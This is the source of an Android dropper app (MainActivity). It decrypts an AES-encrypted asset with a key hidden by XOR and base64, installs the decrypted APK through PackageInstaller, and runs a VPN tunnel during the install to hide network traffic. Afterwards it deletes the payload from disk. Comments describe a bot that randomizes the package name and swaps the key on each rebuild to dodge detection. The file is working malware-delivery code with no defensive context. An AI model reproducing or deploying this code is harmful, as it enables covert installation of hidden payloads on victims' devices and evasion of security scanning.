// Package: com.base.util.apps  (suffix 'apps' → bot randomizes to e.g. 'apps' → 'r4k2')
// Build:   Android SDK 21+, minSdk 21, targetSdk 33
// Role:    Dropper — decrypts assets/core.dat, installs via PackageInstaller.Session,
//          VPN tunnel active during install to obscure network traffic pattern.
package com.base.util.apps;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {

    private static final String TAG = "AppCore";
    private static final String ASSET    = "core.dat";
    private static final String OUT_FILE = "base.apk";
    // Install session request code
    private static final int    RC_INSTALL = 9001;
    // Intent action delivered by PackageInstaller on status change
    private static final String ACTION_INSTALL_STATUS = "com.base.util.apps.INSTALL_STATUS";

    private VpnBypassService.VpnBinder vpnBinder;
    private boolean                    vpnConnected = false;
    private File                       outApk;

    private final ServiceConnection vpnConn = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            vpnBinder = (VpnBypassService.VpnBinder) service;
            vpnBinder.setCallback(() -> {
                vpnConnected = true;
                new Handler(Looper.getMainLooper()).post(MainActivity.this::onVpnReady);
            });
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            vpnBinder = null;
        }
    };

    // Receives PackageInstaller status broadcasts
    private final BroadcastReceiver installReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
            if (status == PackageInstaller.STATUS_SUCCESS) {
                Log.i(TAG, "Install success");
                onInstallComplete();
            } else if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                if (confirm != null) startActivityForResult(confirm, RC_INSTALL);
            } else {
                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                Log.e(TAG, "Install failed: " + msg);
                finish();
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        IntentFilter f = new IntentFilter(ACTION_INSTALL_STATUS);
        if (Build.VERSION.SDK_INT >= 33) {
            registerReceiver(installReceiver, f, RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(installReceiver, f);
        }

        startVpn();
    }

    // ── VPN phase ──────────────────────────────────────────────────────

    private void startVpn() {
        Intent prep = android.net.VpnService.prepare(this);
        if (prep != null) {
            startActivityForResult(prep, 0);
        } else {
            bindVpnService();
        }
    }

    private void bindVpnService() {
        Intent svc = new Intent(this, VpnBypassService.class);
        startService(svc);
        bindService(svc, vpnConn, BIND_AUTO_CREATE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 0 && resultCode == RESULT_OK) {
            bindVpnService();
        } else if (requestCode == RC_INSTALL && resultCode == RESULT_OK) {
            onInstallComplete();
        } else if (requestCode == 0) {
            // User denied VPN — install anyway without tunnel
            vpnConnected = false;
            onVpnReady();
        }
    }

    // ── Decrypt + install phase ───────────────────────────────────────────

    private void onVpnReady() {
        new Thread(this::decryptAndInstall).start();
    }

    private void decryptAndInstall() {
        try {
            outApk = new File(getFilesDir(), OUT_FILE);
            decryptAsset(ASSET, getKey(), outApk);
            runOnUiThread(this::startInstallSession);
        } catch (Exception e) {
            Log.e(TAG, "Decrypt failed", e);
            runOnUiThread(this::finish);
        }
    }

    // Returns AES-256 key.  Stored as base64(key XOR 0x55) — no plaintext hex in DEX.
    // Bot replaces this 44-char string each rebuild; length stays 44 → ULEB128 unchanged.
    private static byte[] getKey() {
        String _ek = "t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38=";
        byte[] xk  = android.util.Base64.decode(_ek, android.util.Base64.DEFAULT);
        for (int i = 0; i < xk.length; i++) xk[i] ^= 0x55;
        return xk;
    }

    private void decryptAsset(String asset, byte[] key, File out) throws Exception {
        try (InputStream in = getAssets().open(asset);
             FileOutputStream fos = new FileOutputStream(out)) {

            byte[] iv  = new byte[16];
            int    got = 0;
            while (got < 16) {
                int r = in.read(iv, got, 16 - got);
                if (r < 0) throw new IOException("Asset too short for IV");
                got += r;
            }

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE,
                    new SecretKeySpec(key, "AES"),
                    new IvParameterSpec(iv));

            byte[] buf = new byte[65536];
            int    n;
            while ((n = in.read(buf)) > 0) {
                fos.write(cipher.update(buf, 0, n));
            }
            fos.write(cipher.doFinal());
        }
    }

    private void startInstallSession() {
        PackageInstaller pi = getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params =
                new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);

        try {
            int sessionId = pi.createSession(params);
            try (PackageInstaller.Session session = pi.openSession(sessionId)) {
                try (OutputStream out = session.openWrite("base", 0, outApk.length());
                     java.io.FileInputStream fis = new java.io.FileInputStream(outApk)) {
                    byte[] buf = new byte[65536];
                    int n;
                    while ((n = fis.read(buf)) > 0) out.write(buf, 0, n);
                    session.fsync(out);
                }

                android.app.PendingIntent pi2 = android.app.PendingIntent.getBroadcast(
                        this, sessionId,
                        new Intent(ACTION_INSTALL_STATUS).setPackage(getPackageName()),
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT
                                | (Build.VERSION.SDK_INT >= 31 ? android.app.PendingIntent.FLAG_MUTABLE : 0)
                );
                session.commit(pi2.getIntentSender());
            }
        } catch (Exception e) {
            Log.e(TAG, "Session install failed", e);
            finish();
        }
    }

    // ── Post-install ──────────────────────────────────────────────────

    private void onInstallComplete() {
        // Clean up decrypted APK from disk
        if (outApk != null) outApk.delete();
        // Disconnect VPN
        if (vpnBinder != null) vpnBinder.stopTunnel();
        try { unbindService(vpnConn); } catch (Exception ignored) {}
        stopService(new Intent(this, VpnBypassService.class));
        finish();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try { unregisterReceiver(installReceiver); } catch (Exception ignored) {}
    }
}
